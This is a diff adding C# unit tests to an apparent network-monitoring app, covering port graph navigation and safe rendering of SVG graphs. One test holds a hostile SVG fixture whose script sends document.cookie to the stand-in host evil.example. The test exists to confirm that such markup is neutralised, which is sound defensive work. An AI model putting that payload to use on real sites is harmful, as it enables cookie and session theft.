@@ -274,6 +274,26 @@ public sealed class DeviceSectionViewModelTests
 
         Assert.Equal(3, navigation.Visits.Single().Parameters![Routes.DeviceIdParameter]);
     }
+
+    [Fact]
+    public async Task Tapping_a_port_opens_its_graphs()
+    {
+        var navigation = new RecordingNavigation();
+        var client = Fakes.Client();
+        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns([new Port { PortId = 1, IfName = "Gi0/5", IfDescr = "GigabitEthernet0/5", IfOperStatus = "up" }]);
+        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), navigation);
+        await vm.LoadAsync(7, DeviceSection.Ports, "edge-rtr");
+
+        var row = vm.Groups.SelectMany(g => g).Single();
+        Assert.True(row.IsLink);
+        await vm.OpenLinkCommand.ExecuteAsync(row);
+
+        var visit = navigation.Visits.Single();
+        Assert.Equal(Routes.DeviceGraphs, visit.Route);
+        Assert.Equal(7, visit.Parameters![Routes.DeviceIdParameter]);
+        Assert.Equal("Gi0/5", visit.Parameters[Routes.PortParameter]);
+        Assert.Equal("edge-rtr", visit.Parameters[Routes.DeviceNameParameter]);
+    }
 }
 
 public sealed class GraphTests
@@ -292,11 +312,42 @@ public sealed class GraphTests
     [Fact]
     public void Dark_mode_recolours_rrdtools_black_text_as_desktop_does()
     {
-        Assert.Contains("rgb(0%, 0%, 0%)", GraphHtml.Build(RrdSvg, dark: false));
+        Assert.Contains("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(GraphHtml.Build(RrdSvg, dark: false)));
 
         var dark = GraphHtml.Build(RrdSvg, dark: true);
-        Assert.DoesNotContain("rgb(0%, 0%, 0%)", dark);
+        Assert.DoesNotContain("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(dark));
         Assert.Contains("#11141A", dark);
+    }
+
+    [Fact]
+    public void A_hostile_graph_is_shown_as_an_image_never_as_markup()
+    {
+        const string hostile = "<svg width=\"10\" height=\"10\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"steal()\">"
+            + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>"
+            + "<foreignObject><iframe src=\"https://evil.example/\"></iframe></foreignObject>"
+            + "<a href=\"https://evil.example/\"><text>click</text></a></svg>";
+
+        var page = GraphHtml.Build(hostile, dark: false);
+
+        // Nothing from the SVG reaches the page as markup...
+        Assert.DoesNotContain("<script", page, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("onload", page, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("evil.example", page, StringComparison.OrdinalIgnoreCase);
+        Assert.DoesNotContain("<iframe", page, StringComparison.OrdinalIgnoreCase);
+
+        // ...it's only an image, under a policy that allows no script or network.
+        Assert.Contains("src=\"data:image/svg+xml;base64,", page);
+        Assert.Contains($"content=\"{GraphHtml.ContentSecurityPolicy}\"", page);
+        Assert.Contains("default-src 'none'", GraphHtml.ContentSecurityPolicy);
+        Assert.DoesNotContain("script-src", GraphHtml.ContentSecurityPolicy);
+        Assert.Contains("<script>", GraphHtml.ImageOf(page)); // still in the image, where it can't run
+    }
+
+    [Fact]
+    public void An_svg_without_a_namespace_gets_one_so_it_draws_as_an_image()
+    {
+        Assert.Contains("xmlns=\"http://www.w3.org/2000/svg\"", GraphHtml.WithNamespace("<svg width=\"1\"><g/></svg>"));
+        Assert.Equal(RrdSvg, GraphHtml.WithNamespace(RrdSvg));
     }
 
     [Fact]
@@ -314,7 +365,7 @@ public sealed class GraphTests
 
         Assert.Equal(["Temperature", "Uptime"], vm.Graphs.Select(g => g.Description));
         Assert.Equal("device_temperature", vm.SelectedGraph!.Name);
-        Assert.Contains("viewBox", vm.GraphPage);
+        Assert.Contains("viewBox", GraphHtml.ImageOf(vm.GraphPage!));
         await client.Graphs.Received(1).GetSvgAsync(7, "device_temperature", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
     }
 
@@ -336,6 +387,28 @@ public sealed class GraphTests
 
         await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastWeek, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
         await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
+    }
+
+    [Fact]
+    public async Task A_port_shows_desktops_port_graphs_starting_with_traffic()
+    {
+        var client = Fakes.Client();
+        client.Graphs.GetPortSvgAsync(7, Arg.Any<string>(), Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
+        var vm = new DeviceGraphsViewModel(client);
+
+        await vm.LoadPortAsync(7, "Gi0/5", "GigabitEthernet0/5", "edge-rtr");
+
+        Assert.Equal("GigabitEthernet0/5 · edge-rtr", vm.Title);
+        Assert.Equal(["port_bits", "port_upkts", "port_nupkts", "port_errors"], vm.Graphs.Select(g => g.Name));
+        Assert.Equal("port_bits", vm.SelectedGraph!.Name);
+        Assert.NotNull(vm.GraphPage);
+        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_bits", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
+        await client.Graphs.DidNotReceiveWithAnyArgs().GetSvgAsync(default, default!, default, default, default, default);
+        await client.Graphs.DidNotReceiveWithAnyArgs().ListAsync(default, default);
+
+        vm.SelectedGraph = vm.Graphs[3];
+        await vm.LoadGraphAsync();
+        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_errors", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
     }
 }
 
